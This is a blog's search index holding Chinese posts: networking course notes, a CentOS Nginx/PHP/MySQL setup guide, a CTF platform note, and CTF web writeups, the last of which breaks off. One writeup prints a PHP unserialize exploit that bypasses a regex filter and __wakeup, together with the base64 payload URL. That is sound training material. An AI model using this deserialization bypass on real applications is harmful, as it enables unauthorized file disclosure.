<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>计算机网络笔记[概述]</title>
    <url>/2020/02/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/2020-2-24ZoomOut_ZH-CN4471982075_1920x1080.jpg" alt=""></p>
<a id="more"></a>

<h1 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 - 概述"></a>第一章 - 概述</h1><p>21世纪的重要特征：<code>数字化</code>、<code>网络化</code>、<code>信息化</code>，它是一个<code>以网络为核心的信息时代</code>。<br>三网：<code>电信网络</code>，<code>有线电视网络</code>，<code>计算机网络</code></p>
<p>因特网起源于美国，是世界上最大的国际性计算机互联网。</p>
<p><code>网络</code>由若干<code>结点</code>和连接这些结点的<code>链路</code>组成。</p>
<p>网络中的结点可以是：计算机、集线器、交换机或路由器。</p>
<p>网络和网络还可以通过路由器互连起来，这样就构成了一个覆盖范围更大的网络，即<code>互联网</code>，又称<code>网络的网络</code>。</p>
<p>因特网是世界上最大的互连网络。</p>
<p><code>主机</code>：一般把连接在因特网上的计算机都称为主机。</p>
<p><code>网络把许多计算机连接在一起，而因特网则把许多网络连接在一起。</code></p>
<h2 id="计算机网络的定义"><a href="#计算机网络的定义" class="headerlink" title="计算机网络的定义"></a>计算机网络的定义</h2><blockquote>
<p>计算机网络的精确定义并未统一。最简单的定义是：<br>一些<code>互连</code>的、<code>自治</code>的计算机的集合。<br><code>互连</code>指计算机之间能够进行数据通信或交换信息，<br><code>自治</code>指独立的计算机，有自己的硬件和软件，可以单端运行使用。</p>
<p>目前通常认为计算机网络是指将不同地理位置，具有独立功能的多台计算机及网络设备通过通信线路连接起来，<br>在网络操作系统、网络管理软件及网络通信协议得共同管理和协调下实现资源共享和信息传递的计算机系统。</p>
</blockquote>
<h2 id="计算机网络的功能"><a href="#计算机网络的功能" class="headerlink" title="计算机网络的功能"></a>计算机网络的功能</h2><blockquote>
<p>计算机网络向用户提供的最重要的功能有两个：</p>
<ul>
<li><code>连通性</code>，计算机网络使上网用户之间都可以交换信息，好像这些用户的计算机都可以彼此直接连通一样。</li>
<li><code>共享</code>，指资源共享。</li>
</ul>
</blockquote>
<h2 id="计算机网络的拓扑结构的类型"><a href="#计算机网络的拓扑结构的类型" class="headerlink" title="计算机网络的拓扑结构的类型"></a>计算机网络的拓扑结构的类型</h2><p>按工作方式分：</p>
<ul>
<li><code>边缘部分</code>，由所有连接在网络上的主机组成，由用户直接使用</li>
<li><code>核心部分</code>，由大量网络和连接这些网络的路由器组成，向用户提供服务（连通性和交换）</li>
</ul>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">边缘部分的通信方式有两种：</span><br><span class="line"><span class="bullet">- </span>C/S</span><br><span class="line"><span class="bullet">- </span>P2P</span><br><span class="line"></span><br><span class="line">核心部分的路由器非常重要，它采用存储转发的方式转发分组，是实现分组交换的关键构件</span><br></pre></td></tr></table></figure>

<p>按作用范围分：</p>
<ul>
<li><code>广域网 WAN</code>，作用范围通常为几十到几千公里，又称远程网，是因特网的核心部分。</li>
<li><code>城域网 MAN</code>，作用范围一般是一个城市，城域网可以为一个或几个单位所拥有，也可以作为一种公用设施，用来把多个局域网进行互连，多采用以太网技术。</li>
<li><code>局域网 LAN</code>，一般用微型计算机或工作站通过高速通信线路连接。</li>
<li><code>个人区域网 PAN</code></li>
</ul>
<p>按网络使用者分类：</p>
<ul>
<li><code>公用网</code>，指电信公司出资建造的大型网络。</li>
<li><code>专用网</code>，某部门、某行业自己建造的网络，不对外人提供服务。</li>
</ul>
<p>还有一种特殊的计算机网络：<code>接入网 AN</code>，又称本地接入网或居民接入网，用来把用户接到因特网的网络。</p>
<blockquote>
<ul>
<li>星型拓扑</li>
<li>环形拓扑</li>
<li>总线型拓扑</li>
<li>树形拓扑</li>
<li>网状拓扑</li>
<li>混合型拓扑</li>
<li>Ad-Hoc模式（无线局域网）</li>
<li>Infrastructure模式（无线局域网）</li>
</ul>
</blockquote>
<p>因特网发展的三个阶段：</p>
<ul>
<li>第一阶段：从单个网络<code>ARPANET</code>向互联网发展的过程。</li>
<li>第二阶段：三级结构的因特网<code>NSFNET</code>，分为主干网、地区网和校园网(或企业网)。</li>
<li>第三阶段：多层次ISP结构的因特网。</li>
</ul>
<p><code>ISP</code>：因特网服务提供者，分为主干ISP、地区ISP、本地ISP。</p>
<p><code>IXP</code>：因特网交换点，允许两个网络直接相连，并交换分组，而不再需要通过第三个网络来转发分组。IXP 通常工作在数据链路层的网络交换机。</p>
<p>因特网的拓扑结构非常复杂，从工作方式上看，可以分为两大块：</p>
<ul>
<li><code>边缘部分</code>，由所有连接在因特网上的主机组成，由用户直接使用，用来进行通信和资源共享</li>
<li><code>核心部分</code>，由大量网络和连接这些网络的路由器组成，为边缘部分提供服务(连通性和交换)</li>
</ul>
<p>边缘部分的主机又称为<code>端系统</code>。</p>
<p>端系统之间的通信方式：</p>
<ul>
<li><code>C/S</code>，客户-服务器模式，两个主机通信时，一个主机主动请求服务，另一个主机收到请求后提供服务</li>
<li><code>P2P</code>，对等模式，两个主机不区分谁是服务请求方，谁是服务提供方</li>
</ul>
<p>在网络核心部分起特殊作用的是路由器，它是实现分组交换的关键构件。其任务是转发收到的分组。</p>
<p><code>电路交换</code>的特点：</p>
<ol>
<li>建立连接(占用通信资源)</li>
<li>通话(一直占用通信资源)</li>
<li>释放连接(归还通信资源)</li>
</ol>
<p>在通话的全部时间内，通话的两个用户始终占用端到端的通信资源。线路传输的效率十分低。</p>
<p><code>分组交换</code>的特点：</p>
<p>分组交换采用<code>存储转发</code>技术，要发送的数据称为<code>报文</code>，在发送之前，把较长的报文划分为更小的等长的<code>数据段</code>，在每个数据段前面加上一些必要的控制信息组成<code>首部</code>(又称包头)后，就构成了一个分组(又称包)。</p>
<p>分组是<code>因特网传送的数据单元</code>。</p>
<p><code>分组交换</code>的优点：</p>
<ul>
<li>高效，在分组传输的过程中动态分配传输带宽，对通信链路是逐段占用</li>
<li>灵活，为每一个分组独立的选择转发路由</li>
<li>迅速，以分组为传送单位，可以不先建立连接就能向其他主机发送分组</li>
<li>可靠，保证可靠性的网络协议，分布式多路由的分组交换网，是网络由很好的生存性</li>
</ul>
<h2 id="计算机网络主要性能指标"><a href="#计算机网络主要性能指标" class="headerlink" title="计算机网络主要性能指标"></a>计算机网络主要性能指标</h2><blockquote>
<ul>
<li><code>速率</code>，连续在计算机网络上的主机在数字信道上传送数据的速率，又称比特率，一般指额定速率或标称速率</li>
<li><code>带宽</code>，描述网络的通信线路传送数据的能力，在单位时间内从网络中的某一点到另一点所能通过的<code>最高速率</code></li>
<li><code>吞吐量</code>，在单位时间内通过某个网络的数据量。</li>
<li>时延<ul>
<li><code>发送时延</code>，帧长(b) / 发送速率(b/s)，主机或路由器发送数据帧所需要的时间，送数据帧的第一个比特算起，到该帧的最后一个比特发送完所需的时间</li>
<li><code>传播时延</code>，信道长度(m) / 在信道上的传播速率(m/s)，电磁波在信道中传播一定的距离需要花费的时间</li>
<li><code>处理时延</code>，主机或路由器在收到分组时需要花费一定的时间进行处理。</li>
<li><code>排队时延</code>，分组在经过网络传输时，要经过许多路由器，但分组在进入路由器后要先在输入队列中排队等待处理。在输出队列中排队等待转发。</li>
</ul>
</li>
<li><code>时延带宽积</code>，传播时延 X 带宽，又称以比特为单位的链路长度，表示链路可以容纳多少个比特，</li>
<li><code>往返时延RTT</code>，从发送方发送数据开始，到发送方收到来自接收方的确认，总共经历的时间。</li>
<li>利用率，利用率过高会产生非常大的时延<ul>
<li><code>信道利用率</code>，某信道有百分之几的时间是被利用用的。</li>
<li><code>网络利用率</code>，全网络的信道利用率的加权平均值。</li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="计算机网络为什么分层（分层的好处）"><a href="#计算机网络为什么分层（分层的好处）" class="headerlink" title="计算机网络为什么分层（分层的好处）"></a>计算机网络为什么分层（分层的好处）</h2><p>计算机网络的分层是垂直的，分层有很多好处：</p>
<ul>
<li><code>保持独立</code>，各层之间是独立的，每层只实现一种相对独立的功能</li>
<li><code>灵活性好</code>，由于各层之间是独立的，因此当任何一层实现发生变化时，不会影响其上下层，不需要时也可以直接取消这层</li>
<li><code>结构上可分割</code>，由于各层独立，因此每一层都可以采用最合适的技术来实现</li>
<li><code>能促进标准化工作</code></li>
</ul>
<p>每一层所需要完成的功能：</p>
<ul>
<li><code>差错控制</code>，使网络对等端的相应层次的通信更加可靠</li>
<li><code>流量控制</code>，使发送端的发送速率不要太快，要使接收端来得及接收</li>
<li><code>分段和重装</code>，发送端把要发送的数据块划分为更小的单位，在接收端将其还原</li>
<li><code>复用和分用</code>，发送端几个高层会话复用一条底层的连接，在接收端再进行分用</li>
<li><code>连接建立和释放</code>，交换数据前先建立一条逻辑连接，数据传送结束后释放连接</li>
</ul>
<h2 id="计算机网络协议"><a href="#计算机网络协议" class="headerlink" title="计算机网络协议"></a>计算机网络协议</h2><blockquote>
<p>网络协议是为进行网络中的数据交换而建立的规则、标准或约定。</p>
</blockquote>
<p>这些规则明确规定了所交换的数据的格式以及有关的同步的问题</p>
<p>网络协议由三个要素组成：</p>
<blockquote>
<ul>
<li><code>语法</code>：数据与控制信息的结构或格式（所交换的信息的格式）</li>
<li><code>语义</code>：需要发出何种控制信息，完成何种动作，以及做出何种响应</li>
<li><code>同步</code>：事件实现顺序的详细说明（收发双方的时序关系）</li>
</ul>
</blockquote>
<h2 id="计算机网络服务"><a href="#计算机网络服务" class="headerlink" title="计算机网络服务"></a>计算机网络服务</h2><p>服务是垂直的，指下层为紧邻的上层提供的功能调用</p>
<blockquote>
<ol>
<li>在协议的控制下，两个对等实体间的通信使得本层能够向上一层提供服务。要实现本层的协议，还需要使用下面一层所提供的服务。</li>
<li>服务是能够被高一层的实体看得见的功能。协议的实现保证了能够向上一层提供服务，使用本层服务的实体只看得见服务，而看不见下面的协议。协议是水平的，服务是垂直的，即服务是由下层向上层通过层间接口提供的。</li>
</ol>
</blockquote>
<h2 id="计算机网络接口"><a href="#计算机网络接口" class="headerlink" title="计算机网络接口"></a>计算机网络接口</h2><p>计算机网络接口是一个逻辑上的抽象的概念（并非硬件接口）</p>
<p>它是同一系统中，相邻的两层的实体之间进行交换信息的地方，通常称为服务访问点 SAP</p>
<h2 id="OSI-RM分层"><a href="#OSI-RM分层" class="headerlink" title="OSI/RM分层"></a>OSI/RM分层</h2><p>开放系统互连基本参考模型，是法律上的国际标准，但实际上事实上的国际标准是TCP/IP。<br>OSI/RM从上到下有七层：</p>
<blockquote>
<ul>
<li>7：<code>应用层</code>，网络服务与用户应用程序之间的一个接口</li>
<li>6：<code>表示层</code>，数据表示、数据安全、数据压缩（进行数据格式转换）</li>
<li>5：<code>会话层</code>，会话层连接到传输层的映射，会话连接的流量控制，数据传输，会话连接恢复与释放，会话连接管理、差错控制（会话管理和数据同步）</li>
<li>4：<code>运输层</code>，用一个寻址机制来标识一个特定的应用程序（端到端透明的传输报文）</li>
<li>3：<code>网络层</code>，基于网络层地址进行不同网络系统间的路径选择（分组传输和路由选择）</li>
<li>2：<code>数据链路层</code>，在物理层上建立、撤销、标识逻辑链接和链路复用，以及差错校验等功能，通过使用接收系统的硬件地址或物理地址来寻址（在链路上无差错的传输一帧一帧的信息）</li>
<li>1：<code>物理层</code>，建立、维护和取消物理连接（将比特流放到物理介质上传送 ）</li>
</ul>
</blockquote>
<p>对层次之间的数据传送单位：<code>PDU</code>-协议数据单元</p>
<p>层与层之间的数据传送单位：<code>SDU</code>-服务数据单元</p>
<h2 id="TCP-IP参考模型分层"><a href="#TCP-IP参考模型分层" class="headerlink" title="TCP/IP参考模型分层"></a>TCP/IP参考模型分层</h2><p>TCP/IP从上到下有4层：</p>
<blockquote>
<ul>
<li>4：<code>应用层</code>（相当于OSI的5、6、7层）</li>
<li>3：<code>运输层</code>（TCP、UDP）（相当于OSI的4层）</li>
<li>2：<code>网际层IP</code>（相当于OSI的3层）</li>
<li>1：<code>网络接口层</code>（相当于OSI的1、2层）</li>
</ul>
</blockquote>
<p>但为了好理解，一般采用五层结构的 TCP/IP 体系来讲解：</p>
<blockquote>
<ul>
<li>5：<code>应用层</code>，定义应用进程间通信和交互的规则，通过应用进程间的交互来完成特定网络应用</li>
<li>4：<code>运输层</code>，负责向两个主机中进程间的通信提供通用的数据传输服务</li>
<li>3：<code>网络层</code>：负责为分组交换网上的不同主机提供通信服务，同时也负责选择合适的路由，是源主机运输层所传下来的分组能够通过网络中的路由器找到目的主机</li>
<li>2：<code>数据链路层</code>，将网络层交下来的IP数据报组装成帧，在两个相邻结点间的链路上传送帧</li>
<li>1：<code>物理层</code></li>
</ul>
</blockquote>
<p>各层的数据单元、单位：</p>
<ul>
<li>应用层：<code>报文</code></li>
<li>传输层：<ul>
<li>TCP：<code>报文段</code></li>
<li>UDP：<code>用户数据报</code></li>
</ul>
</li>
<li>网络层：<code>IP数据报</code>（分组、包、数据报）</li>
<li>数据链路层：<code>帧</code></li>
<li>物理层：<code>比特</code></li>
</ul>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>环境搭建</title>
    <url>/2020/02/11/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p> CentOs 7 搭建Nginx+php-fpm+MySQL记录</p>
<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/1.jpg" alt=""></p>
<a id="more"></a>

<h1 id="CentOs-7-搭建Nginx-php-fpm-MySQL记录"><a href="#CentOs-7-搭建Nginx-php-fpm-MySQL记录" class="headerlink" title="CentOs 7 搭建Nginx+php-fpm+MySQL记录"></a>CentOs 7 搭建Nginx+php-fpm+MySQL记录</h1><p>操作系统：CentOs 7</p>
<h2 id="一-安装Nginx"><a href="#一-安装Nginx" class="headerlink" title="一 安装Nginx"></a>一 安装Nginx</h2><h3 id="1-1添加yum源"><a href="#1-1添加yum源" class="headerlink" title="1.1添加yum源"></a>1.1添加yum源</h3><p>安装wget：</p>
<pre><code>yum install wget -y</code></pre><p>下载对应当前系统版本的nginx包</p>
<pre><code>wget http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm</code></pre><p>由于Nginx不在默认的yum源中，所以需要建立nginx的yum仓库。</p>
<pre><code>rpm -ivh nginx-release-centos-7-0.el7.ngx.noarch.rpm</code></pre><p>安装好yum源后，可以查看一下。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[<span class="symbol">root@</span>root ~]# yum repolist</span><br><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">Loading mirror speeds <span class="keyword">from</span> cached hostfile</span><br><span class="line"> * base: mirrors.aliyun.com</span><br><span class="line"> * extras: mirrors.aliyun.com</span><br><span class="line"> * updates: mirrors.aliyun.com</span><br><span class="line">repo id                                repo name                                                            status</span><br><span class="line">base/<span class="number">7</span>/x86_64                          CentOS<span class="number">-7</span> - Base - mirrors.aliyun.com                                 <span class="number">10</span>,<span class="number">097</span></span><br><span class="line">epel/x86_64                            Extra Packages <span class="keyword">for</span> Enterprise Linux <span class="number">7</span> - x86_64                       <span class="number">13</span>,<span class="number">524</span></span><br><span class="line">extras/<span class="number">7</span>/x86_64                        CentOS<span class="number">-7</span> - Extras - mirrors.aliyun.com                                  <span class="number">323</span></span><br><span class="line">nginx/x86_64                           nginx repo                                                              <span class="number">172</span></span><br><span class="line">updates/<span class="number">7</span>/x86_64                       CentOS<span class="number">-7</span> - Updates - mirrors.aliyun.com                               <span class="number">1</span>,<span class="number">446</span></span><br><span class="line">repolist: <span class="number">25</span>,<span class="number">562</span></span><br></pre></td></tr></table></figure>

<p>可以发现Nginx repo 已经安装到本机了。</p>
<p>由于下载过程中yum的官方源太慢了，这里把yum源换成了阿里云的。</p>
<p>第一步：进入yum源配置文件所在文件夹</p>
<pre><code>cd /etc/yum.repos.d/</code></pre><p>第二步：备份/etc/yum.repos.d/CentOS-Base.repo；</p>
<pre><code>mv ./CentOS-Base.repo ./CentOS-Base.repo.bak</code></pre><p>第三步：下载aliyun的yum源配置文件，放入/etc/yum.repos.d/下，并更改名称为CentOS-Base.repo；</p>
<pre><code>wget http://mirrors.aliyun.com/repo/Centos-7.repo
mv Centos-7.repo CentOS-Base.repo</code></pre><p>第四步：运行yum makecache生成缓存:</p>
<pre><code>yum makecache</code></pre><p>第四步：更新yum:</p>
<pre><code>yum -y update</code></pre><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/LNMP4.png" alt=""></p>
<h3 id="1-2安装Nginx"><a href="#1-2安装Nginx" class="headerlink" title="1.2安装Nginx"></a>1.2安装Nginx</h3><p>让我们回到正题：安装Nginx</p>
<pre><code>yum install -y nginx</code></pre><h3 id="1-3常用配置"><a href="#1-3常用配置" class="headerlink" title="1.3常用配置"></a>1.3常用配置</h3><p>设置开机启动</p>
<pre><code>systemctl enable nginx</code></pre><p>启动服务</p>
<pre><code>systemctl start nginx.service</code></pre><p>停止服务</p>
<pre><code>systemctl restart nginx</code></pre><p>重新加载</p>
<pre><code>systemctl reload nginx</code></pre><h3 id="1-4打开防火墙端口"><a href="#1-4打开防火墙端口" class="headerlink" title="1.4打开防火墙端口"></a>1.4打开防火墙端口</h3><p>默认 CentOS7 使用的防火墙 firewalld 是关闭 http 服务的（打开 80 端口）。</p>
<pre><code>firewall-cmd --zone=public --permanent --add-service=http
firewall-cmd --reload</code></pre><p>这个时候就可以查看一下防火墙打开的所有的服务。</p>
<pre><code>firewall-cmd --list-service</code></pre><p>这时候用浏览器访问目标服务器的IP就可以看到Nginx的默认界面了。</p>
<h2 id="二-安装mysql"><a href="#二-安装mysql" class="headerlink" title="二 安装mysql"></a>二 安装mysql</h2><p>下载mysql的repo源</p>
<pre><code>wget http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpm</code></pre><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/LNMP1.png" alt=""></p>
<p>安装mysql-community-release-el7-5.noarch.rpm包</p>
<pre><code>rpm -ivh mysql-community-release-el7-5.noarch.rpm</code></pre><p>安装MYSQL:</p>
<pre><code>yum install -y mysql-server</code></pre><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/LNMP2.png" alt=""></p>
<p>更改MYSQL用户权限：</p>
<pre><code>chown -R root:root /var/lib/mysql</code></pre><p>重启服务：</p>
<pre><code>systemctl restart mysql.service</code></pre><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/LNMP3.png" alt=""></p>
<h2 id="三-安装php"><a href="#三-安装php" class="headerlink" title="三 安装php"></a>三 安装php</h2><h3 id="3-1安装php"><a href="#3-1安装php" class="headerlink" title="3.1安装php"></a>3.1安装php</h3><p>rpm 安装 Php7 相应的 yum源</p>
<pre><code>rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm
rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</code></pre><p>安装php7.0</p>
<pre><code>yum install -y php70w</code></pre><p>安装php扩展</p>
<pre><code>yum install -y  php70w-mysql.x86_64   php70w-gd.x86_64   php70w-ldap.x86_64   php70w-mbstring.x86_64  php70w-mcrypt.x86_64</code></pre><p>安装PHP FPM：</p>
<pre><code>yum install -y php70w-fpm</code></pre><h3 id="3-2配置"><a href="#3-2配置" class="headerlink" title="3.2配置"></a>3.2配置</h3><p> 修改Nginx配置文件：</p>
<pre><code>vim /etc/nginx/conf.d/default.conf</code></pre><p>修改 root目录,可自定义：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">        index  index.html index.htm index.php;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p> 修改配置php解析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">        root           html;</span><br><span class="line">        fastcgi_pass   <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9000</span>;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME  /usr/share/nginx/html$fastcgi_script_name;</span><br><span class="line">        <span class="keyword">include</span>        fastcgi_params;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>修改php-fpm配置文件<br>php-fpm配置文件位置：（/etc/php-fpm.d/<a href="http://www.conf）" target="_blank" rel="noopener">www.conf）</a></p>
<p>修改</p>
<pre><code>user =nginx
group=nginx</code></pre><p>放入测试文件</p>
<pre><code>cd /usr/share/nginx/html
vi index.php</code></pre><p>在其中写入：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-3启动"><a href="#3-3启动" class="headerlink" title="3.3启动"></a>3.3启动</h3><p>启动nginx服务：</p>
<pre><code>systemctl start nginx.service</code></pre><p>查看启动状态：</p>
<pre><code>systemctl status nginx</code></pre><p> 启动PHP-FPM：</p>
<pre><code>systemctl start php-fpm.service</code></pre><p>查看启动状态：</p>
<pre><code>systemctl status php-fpm.service</code></pre><h3 id="3-4测试"><a href="#3-4测试" class="headerlink" title="3.4测试"></a>3.4测试</h3><p>在浏览器打开localhost/index.php<br>看到 phpinfo 的信息就大功告成！！</p>
]]></content>
      <categories>
        <category>LNMP</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>环境</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建CTF平台</title>
    <url>/2020/01/28/%E6%90%AD%E5%BB%BACTF%E5%B9%B3%E5%8F%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>想搭一个CTF平台给大家刷题，顺便记录一下搭建过程：</p>
<p>过年有活动就在阿里云上租了一个服务器练手：</p>
<p>服务器：Ubuntu 16.04</p>
<p>开源平台：CTFd</p>
<a id="more"></a>]]></content>
      <categories>
        <category>CTFd</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界writeup</title>
    <url>/2020/01/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_writeup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>攻防世界 web writeup</p>
<a id="more"></a>

<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Web-php-unserialize5"><a href="#Web-php-unserialize5" class="headerlink" title="Web php unserialize5"></a>Web php unserialize5</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>主要是两个点:<br>1.preg_match(’/[oc]:\d+:/i’, $var)的绕过<br>2.unserialize时__wakeup的绕过<br>这里给出脚本,没有什么难点,就是两个小技巧:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">    $A = <span class="keyword">new</span> Demo(<span class="string">'fl4g.php'</span>);</span><br><span class="line">    $C = serialize($A);</span><br><span class="line">    <span class="comment">//string(49) "O:4:"Demo":1:&#123;s:10:"Demofile";s:8:"fl4g.php";&#125;"</span></span><br><span class="line">    $C = str_replace(<span class="string">'O:4'</span>, <span class="string">'O:+4'</span>,$C);<span class="comment">//绕过preg_match</span></span><br><span class="line">    $C = str_replace(<span class="string">':1:'</span>, <span class="string">':2:'</span>,$C);<span class="comment">//绕过wakeup</span></span><br><span class="line">    var_dump($C);</span><br><span class="line">    <span class="comment">//string(49) "O:+4:"Demo":2:&#123;s:10:"Demofile";s:8:"fl4g.php";&#125;"</span></span><br><span class="line">    var_dump(base64_encode($C));</span><br><span class="line">    <span class="comment">//string(68) "TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=="</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">index</span>.php?<span class="keyword">var</span>=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></pre></td></tr></table></figure>
<p>得到flag:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>论剑场_writeup</title>
    <url>/2020/01/18/%E8%AE%BA%E5%89%91%E5%9C%BA_writeup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>新bugku_writeup</p>
<a id="more"></a>

<h1 id="Web21"><a href="#Web21" class="headerlink" title="Web21"></a>Web21</h1><p>打开网页显示：</p>
<p>you are not admin !</p>
<p>F12查看发现注释掉的PHP代码：</p>
